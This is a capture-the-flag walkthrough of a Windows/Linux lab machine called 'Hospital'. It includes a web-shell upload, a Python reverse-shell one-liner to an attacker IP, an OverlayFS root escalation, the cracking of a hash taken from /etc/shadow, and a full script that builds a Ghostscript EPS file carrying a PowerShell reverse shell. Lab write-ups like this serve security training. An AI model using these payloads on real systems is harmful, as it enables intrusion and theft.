# **Hospital**

***
![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/fbc116ad-43d4-40b1-af27-550a573e635e)
***

Running our nmap scan we have

```bash
# Nmap 7.94 scan initiated Sun Nov 19 17:45:22 2023 as: nmap -sCV -p- -T4 -oN nmap.txt --min-rate=1000 -v 10.129.45.130
Nmap scan report for 10.129.45.130
Host is up (0.16s latency).
Not shown: 65508 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-19 23:47:46Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-05T18:39:34
| Not valid after:  2024-03-06T18:39:34
| MD5:   0c8a:ebc2:3231:590c:2351:ebbf:4e1d:1dbc
|_SHA-1: af10:4fad:1b02:073a:e026:eef4:8917:734b:f8e3:86a7
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-19T23:48:47+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6071/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6612/tcp open  msrpc             Microsoft Windows RPC
6633/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-19T23:48:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 19 17:49:34 2023 -- 1 IP address (1 host up) scanned in 251.83 seconds
```




Using `smbmap` or `smbclient` we have no host detected



![](https://i.imgur.com/1ZiXW2E.png)



Navigating to the http protocol on port 80 we have this login page



![](https://i.imgur.com/8Hokb09.png)




I couldn't login but we could create an account, i created an account with the following credentials `test:test123` and then successfully logged in





![](https://i.imgur.com/GT8SsET.png)



Here we go with bypassing file upload restrictions, we can't upload any files other than images



![](https://i.imgur.com/a0ENG5f.png)


Using burp i bypassed the restrictions (which did not work as expected 🌚)



![](https://i.imgur.com/S00dXwh.png)



Running dir/file bruteforce we have the uploads folder, definitely that is where our shell is


![](https://i.imgur.com/O81GDsW.png)


Using this [**p0wny shell**](https://github.com/flozz/p0wny-shell/blob/master/shell.php) i got from a friend, i was able to execute commands, because other shell kept breaking as said earlier 🥱


![](https://i.imgur.com/t944jie.png)


Since python 3 is installed we can go ahead and get reverse shell with that from [revshells.com](https://revshells.com)



![](https://i.imgur.com/TziHM1v.png)



We got shell as user **www-data**, using this python payload and `rlwrap` for shell stabilization


```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.34",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![](https://i.imgur.com/Z0SyA4j.png)

To get root cos' we are in a container (confirm with command - `cat /etc/os-release`) - Which is vulnerable to an  unpopular [overlayfs](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/) 😂

```bash
$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
$ setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
```


We can then go ahead and copy user **drwilliam** hash from `/etc/shadow` and then attempt to crack it


![](https://i.imgur.com/zMQ9HGC.png)


We can therefore login to the **webmail** service running on port 443 with user **drwilliams** credential we cracked (Password Re-use 🤟)


![](https://i.imgur.com/qDXPntO.png)



We now have this message focusing on GhostScript and `.eps`


![](https://i.imgur.com/8Doi3RH.png)




Save the `Powershell #3 (Base64)` payload from [**revshells**](https://revshells.com) to a file, will name mine "**whoami**", then use this python script to get a reverse shell


```python
import argparse
import os
import re
import subprocess
import base64

def get_user_input():
    ip_command = "ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1"
    ip = subprocess.check_output(ip_command, shell=True).decode().strip()
    print(f"Detected Tun0 IP: {ip}")
    user_ip = input("Enter to accept IP or type new IP: ")
    ip = user_ip if user_ip else ip
    port = input("Enter NetCat connect back port: ")
    filename = input("Enter filename: ")

    return ip, port, filename

def generate_payload(ip, port):
    payload = f"""$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(( $i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()}};
$client.Close()"""

    base64_payload = base64.b64encode(payload.encode('utf-16le')).decode()
    final_payload = f"powershell -e {base64_payload}"
    escaped_payload = f"(%pipe%{final_payload}) (w) file /DCTDecode filter"
    return escaped_payload

def generate_payload_file(filename, payload):
    content = f"""%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 300 300
%%Title: Malicious EPS

/Times-Roman findfont
24 scalefont
setfont

newpath
50 200 moveto
(Sup breachforums!) show

newpath
30 100 moveto
60 230 lineto
90 100 lineto
stroke
{payload}
showpage"""

    filename = filename + '.eps'
    with open(filename, 'w') as file:
        file.write(content)

def main():
    ip, port, filename = get_user_input()
    payload = generate_payload(ip, port)
    generate_payload_file(filename, payload)
    print(f"\n[+] Generated malicious .eps file: {filename}.eps")
    print(f"[+] Popping your courtesy netcat shell: {ip} -lvnp {port}")
    print(f"[+] Log into RoundCubeMail and reply to Dr Brown's email, \n    attach {filename}.eps and send. Rev Shell takes a few seconds :)")
    command = f'qterminal -e "bash -c \'nc -lvnp {port}; exec bash\'"'
    subprocess.Popen(command, shell=True)

if __name__ == "__main__":
    main()
```


![](https://i.imgur.com/dFW6wpF.png)

- Make sure to upload the `.eps` file that was generated to the server, in my case `whoami.eps`
- Start up your listener with `netcat`
- Send the `whoami.eps` file back, as a message and you should get shell back

Checking the `ghostscript.bat` on our default documents directory we found a username and password


![](https://i.imgur.com/5OvsOAm.png)

We can therefore gain RDP access since port `3389` is opened


![](https://i.imgur.com/yjI8Q0M.png)


I created a `lol.txt` file on document and opened it **blank**, after noticing that there is a script or should i say a cronjob 🤔,  that writes the user **administrator**, username and password automatically for us into a login page after double clicking the `ghostscript.bat`


![](https://i.imgur.com/xZt4lMM.png)


We can then use `psexec.py` to get administrator shell


![](https://i.imgur.com/Pcp7EEj.png)

Admin flag stored in 

```
C:\Users\Administrator\Desktop
```

- Would say am not really that good at solving windows boxes, so if you have any opinions, feel free to reach out, thanks 💌




<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>







